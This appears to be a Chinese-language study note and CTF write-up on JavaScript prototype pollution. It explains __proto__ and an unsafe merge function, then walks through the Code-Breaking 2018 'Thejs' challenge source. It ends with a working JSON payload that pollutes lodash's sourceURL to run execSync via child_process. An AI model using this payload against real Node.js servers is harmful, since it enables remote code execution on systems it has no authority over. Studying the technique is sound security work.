同步：fs.readFileSync() 异步：fs.readFile()（异步的方法函数最后一个参数为回调函数，异步方法性能更高）
原型链污染js原型链_prototype_属性：prototype 属性可以向对象添加属性和方法 object.prototype.name=value
__proto__ 属性：这个实例属性指向对象的原型对象(即原型) objectname[&quot;__proto__&quot;]objectname.__proto__objectname.constructor.prototype
不同对象所生成的原型链如下(部分)： var o = &#123;a: 1&#125;;// o对象直接继承了Object.prototype// 原型链：// o ---&gt; Object.prototype ---&gt; nullvar a = [&quot;yo&quot;, &quot;whadup&quot;, &quot;?&quot;];// 数组都继承于 Array.prototype// 原型链：// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; nullfunction f()&#123; return 2;&#125;// 函数都继承于 Function.prototype// 原型链：// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null
原型链污染原理例： 对于语句：object[a][b] = value 如果可以控制a、b、value的值，将a设置为__proto__，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。 object1 = &#123;&quot;a&quot;:1, &quot;b&quot;:2&#125;;object1.__proto__.foo = &quot;Hello World&quot;;console.log(object1.foo);object2 = &#123;&quot;c&quot;:1, &quot;d&quot;:2&#125;;console.log(object2.foo);
在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承Object.prototype。在获取object2.foo时，由于object2本身不存在foo属性，就会往父类Object.prototype中去寻找。这就造成了一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。
改了 Object.prototype.xxx，等于给所有普通对象都加了一个默认属性 xxx。
merge操作导致原型链污染例： function merge(target, source) &#123; for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] = source[key] &#125; &#125;&#125;let object1 = &#123;&#125;let object2 = JSON.parse(&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;)merge(object1, object2)console.log(object1.a, object1.b)object3 = &#123;&#125;console.log(object3.b)
可见object3的b是从原型中获取到的，说明Object已经被污染了。 题：Code-Breaking 2018 Thejsserver.js const fs = require(&#x27;fs&#x27;)const express = require(&#x27;express&#x27;)const bodyParser = require(&#x27;body-parser&#x27;)const lodash = require(&#x27;lodash&#x27;)const session = require(&#x27;express-session&#x27;)const randomize = require(&#x27;randomatic&#x27;)const app = express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())//必须是json格式 //bodyParser.json() 把JSON解析成JS对象app.use(&#x27;/static&#x27;, express.static(&#x27;static&#x27;))app.use(session(&#123; name: &#x27;thejs.session&#x27;, secret: randomize(&#x27;aA0&#x27;, 16), resave: false, saveUninitialized: false&#125;))app.engine(&#x27;ejs&#x27;, function (filePath, options, callback) &#123; //定义模板引擎 fs.readFile(filePath, (err, content) =&gt; &#123; if (err) return callback(new Error(err)) let compiled = lodash.template(content)//★ 模板引擎+new Function=半个eval //lodash.template(content) 简单理解： //把模板字符串 content 转成一段 JS 源码字符串 source //再用 new Function(...) 变成一个真正的函数执行 let rendered = compiled(&#123;...options&#125;) return callback(null, rendered) &#125;)&#125;)app.set(&#x27;views&#x27;, &#x27;./views&#x27;)app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;)app.all(&#x27;/&#x27;, (req, res) =&gt; &#123; // 定义session let data = req.session.data || &#123;language: [], category: []&#125; if (req.method == &#x27;POST&#x27;) &#123; // 获取post数据并合并 data = lodash.merge(data, req.body) //★ 关键：merge(req.body) req.session.data = data // 再将data赋值给session &#125; res.render(&#x27;index&#x27;, &#123; language: data.language, category: data.category &#125;)&#125;)app.listen(3000, () =&gt; console.log(&#x27;Example app listening on port 3000!&#x27;))
问题出在了lodashs.merge函数这里，这个函数存在原型链污染漏洞。 利用点： req.body 进入 lodash.merge → 原型污染 Object.prototype 然后在模板引擎里调用 lodash.template → 读取被污染的 sourceURL → 拼进 new Function 的代码里 → RCE
HTTP 请求体(req.body) → lodash.merge → 数据进入 data、并有机会污染原型 → 渲染模板时 → lodash.template → 读取被污染的 sourceURL → new Function → 你的 JS 被执行
payload : &#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)&#125;\n//&quot;&#125;&#125;
